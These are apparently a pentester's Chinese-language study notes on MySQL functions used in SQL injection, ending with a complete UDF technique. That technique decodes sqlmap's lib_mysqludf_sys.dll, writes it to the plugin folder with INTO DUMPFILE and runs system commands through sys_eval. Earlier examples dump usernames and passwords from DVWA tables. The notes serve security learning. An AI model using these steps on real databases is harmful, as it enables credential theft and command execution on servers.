Table of Contents                                  
=================                                  

  * [1 数据库函数](#1-数据库函数)                        
     * [1.1 字符串函数](#11-字符串函数)                  
        * [ASCII()](#ascii)                    
        * [CHAR_LENGTH()](#char_length)        
        * [CONCAT()](#concat)                  
        * [CONCAT_WS()](#concat_ws)            
        * [MID()](#mid)                        
     * [1.2 系统信息函数](#12-系统信息函数)                
        * [CONNECTION_ID()](#connection_id)    
        * [CURRENT_USER()](#current_user)      
        * [DATABASE()](#database)              
        * [VERSION()](#version)                
  * [2 执行系统命令](#2-执行系统命令)                      
  * [参考资料](#参考资料)                              

----

## 1 数据库函数

### 1.1 字符串函数

#### ASCII()

返回字符串第一个字符的 ascii 值，同 ORD()

![1566728424917](assets/1566728424917.png) 

#### CHAR_LENGTH()

返回字符串的字符数

```mysql
select char_length('droplet')x;
select char_length((select user from mysql.user limit 0,1))x;
```

![1566723511928](assets/1566723511928.png) 

#### CONCAT()

合并多个字符串

```mysql
select concat('awesome','cool')x;
```

![1566725624714](assets/1566725624714.png) 

#### CONCAT_WS()

与前者相同，但第一个字符串可以当作分隔符

```mysql
select concat_ws('::',user,password)x from dvwa.users;
```

![1566725644829](assets/1566725644829.png) 

#### MID()

截取字符串，与 SUBSTRING()，SUBSTR() 相同

```mysql
select mid('admin',2,1);   # 从第2个位置开始截取1个字符
```

![1566726127555](assets/1566726127555.png) 

### 1.2 系统信息函数

#### CONNECTION_ID()

返回服务器连接 id

![1566728072087](assets/1566728072087.png) 

使用 `show full processlist` 查看当前所有连接

![1566728152953](assets/1566728152953.png)

#### CURRENT_USER()

返回当前用户，同 SESSION_USER()、SYSTEM_USER()、USER()

![1566728684947](assets/1566728684947.png) 

#### DATABASE()

返回当前数据库名

![1566728718132](assets/1566728718132.png) 

#### VERSION()

返回数据库版本号

![1566728851730](assets/1566728851730.png) 

----

## 2 执行系统命令

**udf.dll 存放位置分为2种情况：**

1. MySQL 版本大于5.1：
   udf.dll 文件必须放在 MySQL 安装目录的lib\plugin文件夹下。
2. MySQL版本小于5.1：
   Win 2000 的服务器，需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。
   Win2003 服务器，要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。

sqlmap 自带了 udf.dll 文件在 sqlmap/udf/ 中，但文件经过编码，无法直接使用，可以通过 sqlmap/extra/cloak/cloak.py 解码后使用

```
python cloak.py -d -i ..\..\udf\mysql\windows\64\lib_mysqludf_sys.dll_
```



**查看相关信息：**

```mysql
select @@plugin_dir;
select @@version_compile_os;
```

![1566737605785](assets/1566737605785.png) 

**使用 `into dumpfile` 写入**

**对 lib_mysqludf_sys.dll 文件内容进行16进制编码**：

```mysql
select hex(load_file('D:\\Pentest Tools\\sqlmap\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll'))
```

![1566739220944](assets/1566739220944.png) 

**复制编码内容，写入文件**：

```mysql
select unhex('16进制内容') into dumpfile 'D:\\www\\mysql56\\lib\\plugin\\udf.dll';
```

**创建函数：**

```mysql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

**执行命令：**

```mysql
select sys_eval('whoami');
```

![1566743432214](assets/1566743432214.png) 

----

## 参考资料

> https://www.runoob.com/mysql/mysql-functions.html
>
> https://www.freebuf.com/column/210196.html